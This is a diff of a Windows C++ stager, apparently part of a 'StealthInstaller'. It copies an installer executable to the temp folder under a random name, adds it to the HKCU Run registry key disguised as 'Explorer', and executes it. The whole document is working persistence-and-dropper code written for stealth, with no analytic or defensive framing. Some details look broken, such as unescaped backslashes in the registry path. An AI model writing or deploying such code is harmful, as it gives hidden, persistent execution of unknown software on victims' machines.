@@ -1,56 +1,71 @@
 #include <iostream>
 #include <Windows.h>
+#include <time.h>
 #define INSTALLER_NAME "StealthInstaller.exe"
+#define REGVALUE_NAME "Explorer"
 char TemporaryPath[MAX_PATH + sizeof(INSTALLER_NAME) + 1] = { 0 };
 
 
-DWORD InstallerThread(LPVOID lpThreadParameter) {
-	system(TemporaryPath);
-	return 0;
+void CreateRandomName(DWORD NameLength, const char* NameExtension, char* NameBuffer) {
+	char RandomizedName[MAX_PATH] = { 0 };
+	int NameIndex = 0;
+	const char CharacterSet[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789-_";
+	if (NameBuffer != NULL && NameLength != 0) {
+		srand((unsigned int)time(NULL));
+		for (; NameIndex < NameLength; NameIndex++) {
+			RandomizedName[NameIndex] = CharacterSet[rand() % (sizeof(CharacterSet) - 1)];
+		}
+		RandomizedName[NameIndex] = '\0';
+		if (NameBuffer != NULL) {
+			strcat_s(RandomizedName, NameExtension);
+		}
+		RtlCopyMemory(NameBuffer, RandomizedName, strlen(RandomizedName) + 1);
+	}
 }
-
-
 int main() {
+	const DWORD InstallerNameLength = 20;
 	char StagerName[MAX_PATH] = { 0 };
-	char DrivePrefix[3] = { 0 };
-	std::string RegistryCommand(R"(reg add “HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” / v MSUpdate / t REG_SZ / d )");
-	std::string CopyCommand("copy ");
+	char DrivePrefix[4] = { 0 };
+	char CopyCommand[MAX_PATH]="copy ";
+	char InstallerName[InstallerNameLength + 5] = { 0 };  // InstallerNameLength + .exe + \0
+	HKEY AutorunKey = { 0 };
+	LSTATUS LastError = 0;
 
 
 	// Create path in registry:
-	DWORD LastError = GetTempPathA(MAX_PATH + sizeof(INSTALLER_NAME) + 1, TemporaryPath);
+	DWORD StringLength = GetTempPathA(MAX_PATH + sizeof(INSTALLER_NAME) + 1, TemporaryPath);
+	if (StringLength == 0) {
+		return GetLastError(); // String length is invalid
+	}
+	CreateRandomName(InstallerNameLength, ".exe", InstallerName);
+	printf(InstallerName);
+	strcat_s(TemporaryPath, InstallerName);
+	LastError = RegCreateKeyA(HKEY_CURRENT_USER, "SOFTWARE\Microsoft\Windows\CurrentVersion\Run", &AutorunKey);
 	if (LastError != ERROR_SUCCESS) {
 		return LastError;
 	}
-	strcat_s(TemporaryPath, INSTALLER_NAME);
-	RegistryCommand += TemporaryPath + std::string(R"(” /f)");
-	system(RegistryCommand.c_str());
-
-
-	// Copy installer into the right path
-	LastError = GetModuleFileNameA(NULL, StagerName, MAX_PATH);
+	LastError = RegSetValueExA(AutorunKey, REGVALUE_NAME, 0, REG_SZ, (const BYTE*)TemporaryPath, strlen(TemporaryPath) +1);
+	RegCloseKey(AutorunKey);
 	if (LastError != ERROR_SUCCESS) {
 		return LastError;
+	}
+
+
+	// Copy installer into the right path:
+	StringLength = GetModuleFileNameA(NULL, StagerName, MAX_PATH);
+	if (StringLength == 0) {
+		return GetLastError();
 	}
 	DrivePrefix[0] = StagerName[0];
 	DrivePrefix[1] = ':';
 	DrivePrefix[2] = '\\';
-	CopyCommand += DrivePrefix;
-	CopyCommand += INSTALLER_NAME;
-	system(CopyCommand.c_str());
+	strcat_s(CopyCommand, DrivePrefix);
+	strcat_s(CopyCommand, INSTALLER_NAME);
+	strcat_s(CopyCommand, " ");
+	strcat_s(CopyCommand, TemporaryPath);
+	system(CopyCommand);
 
 
-	// Execute installer in another thread and wait for it to finish:
-	HANDLE ThreadHandle = CreateThread(
-		NULL,                   // default security attributes
-		0,                      // use default stack size  
-		InstallerThread,       // thread function name
-		NULL,          // argument to thread function 
-		0,                      // use default creation flags 
-		NULL);   // returns the thread identifier
-	if (ThreadHandle == NULL) {
-		return GetLastError();
-	}
-	LastError = WaitForSingleObject(ThreadHandle, INFINITE);
-	return LastError;
+	// Execute installer initially:
+	return 	system(TemporaryPath);
 }
